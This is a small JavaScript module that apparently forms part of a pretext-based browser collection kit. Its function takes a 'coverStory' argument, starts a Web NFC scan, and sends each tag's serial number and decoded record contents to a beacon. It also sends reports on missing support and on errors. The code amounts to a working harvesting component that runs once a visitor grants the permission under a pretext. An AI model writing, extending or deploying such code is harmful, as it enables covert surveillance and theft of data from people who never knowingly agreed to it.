import { forceEvent } from '../beacon.js';

export async function requestPermission(coverStory, options) {
  if (!window.NDEFReader) {
    await forceEvent('nfc', { supported: false });
    return { supported: false };
  }
  try {
    const reader = new NDEFReader();
    await reader.scan();
    reader.addEventListener('reading', async ({ serialNumber, message }) => {
      await forceEvent('nfc', {
        serialNumber,
        records: message.records.map(r => ({
          recordType: r.recordType,
          mediaType: r.mediaType,
          data: r.recordType === 'text'
            ? new TextDecoder().decode(r.data)
            : Array.from(new Uint8Array(r.data)).map(b => b.toString(16).padStart(2, '0')).join(''),
        })),
      });
    });
    return { scanning: true };
  } catch (e) {
    await forceEvent('nfc', { supported: false, error: e.message });
    return { supported: false, error: e.message };
  }
}
